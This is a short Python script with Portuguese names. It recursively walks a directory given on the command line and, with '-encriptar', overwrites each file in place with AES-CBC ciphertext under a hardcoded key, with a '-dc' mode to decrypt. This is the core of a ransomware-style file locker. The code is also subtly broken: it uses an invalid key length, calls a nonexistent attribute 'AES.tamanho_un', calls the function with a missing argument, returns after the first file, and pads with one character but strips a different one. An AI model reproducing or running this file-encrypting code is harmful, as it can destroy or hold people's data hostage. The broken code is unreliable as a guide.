import os
import sys
from stat import *
from Crypto.Cipher import AES
import os
from Crypto.Protocol.KDF import PBKDF2

def transversionador(top, retorno):
    diretorios = os.listdir(top)
    for arquivos in diretorios:
        caminho = os.path.join(top, arquivos)
        modo = os.stat(caminho)[ST_MODE]

        if S_ISDIR(modo):
            transversionador(caminho, retorno)

        elif S_ISREG(modo):
            chave = '%'

            if sys.argv[1] == '-encriptar':
                iv = os.urandom(16)
                modo = AES.MODE_CBC
                en_AES = AES.new(chave, modo, IV=iv)
                bs = AES.tamanho_un

                f = open(caminho, 'r')
                unidade = f.read(1024*bs)
                if len(unidade) % bs != 0:
                    tamanho = 16 - (len(unidade) % 16)
                    unidade += ' ' * tamanho
                fw = open(caminho, 'w')
                fw.write(iv+en_AES.encrypt(unidade))

            if sys.argv[1] == '-dc':
                fr=open(caminho,'r')
                fra=fr.read(1024*16)
                chave='%'
                iv = fra[:16]
                modo = AES.MODE_CBC
                AES_dec = AES.new(chave, modo, IV=iv)
                fw1=open(caminho,'w')
                original=AES_dec.decrypt(fra[16:])
                fw1.write(original.replace('*',''))
            return(caminho)   
        else:
            print("Ignorando %s" % (caminho))


transversionador(sys.argv[2])
